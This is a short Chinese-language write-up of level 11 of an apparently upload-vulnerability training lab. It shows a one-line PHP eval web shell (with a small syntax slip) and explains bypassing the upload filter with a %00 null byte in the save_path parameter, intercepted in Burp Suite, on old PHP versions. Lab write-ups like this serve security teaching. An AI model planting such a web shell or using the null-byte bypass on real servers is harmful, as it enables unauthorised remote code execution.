## 解题wp(By:独立团孙德胜Alan)
本pass可以通过增加点的方式绕过，注意，此Pass需要修改PHP环境为5.2.17

## 1.打开第十一关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)



## 3.分析代码

##### ![](./img/3.png)

##### $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext

##### //$_GET和之前的$_POST差不多，主要是可以进行抓包修改

##### 然后通过

##### move_uploaded_file($temp_file,$img_path)函数利用

##### %00截断

##### 截取的数据包，把标记的内容修改成../upload/test.php%00。这样实际是将1.jpg的内容移动到test.php文件中了。

##### 因为$img_path变量是../upload/test.php%00xxx.jpg。在php版本<5.3.4且magic_quotes_gpc=off时

##### 以上为服务器phpinfo中的信息。../upload/test.php%00xxx.jpg会被认为../upload/test.php

##### 利用move_uploaded_file函数，临时路径下的jpg文件内容写入../upload/test.php中

## 4.我们可以使用Burpsutie抓包，使用%00绕过

![](./img/4.png)

